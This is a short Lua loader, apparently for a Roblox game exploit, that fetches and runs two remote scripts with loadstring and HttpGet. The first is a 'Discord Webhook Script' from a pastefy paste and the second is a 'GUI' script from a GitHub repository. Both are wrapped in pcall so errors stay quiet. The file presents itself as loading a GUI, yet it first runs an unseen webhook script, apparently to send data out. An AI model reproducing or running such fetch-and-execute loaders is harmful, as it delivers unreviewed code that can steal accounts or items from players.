-- Run Discord Webhook Script Safely
local success1, err1 = pcall(function()
    loadstring(game:HttpGet('https://pastefy.app/GYjzU6qr/raw', true))()
end)

-- Optional: Print error if it failed
if not success1 then
    warn("Discord Webhook Script Error: ", err1)
end

-- Wait 2 seconds before loading GUI
task.wait(2)

-- Run GUI Script Safely
local success2, err2 = pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/growagardenv3/Kripkrop/refs/heads/main/Flick.lua", true))()
end)

-- Optional: Print error if it failed
if not success2 then
    warn("GUI Script Error: ", err2)
end
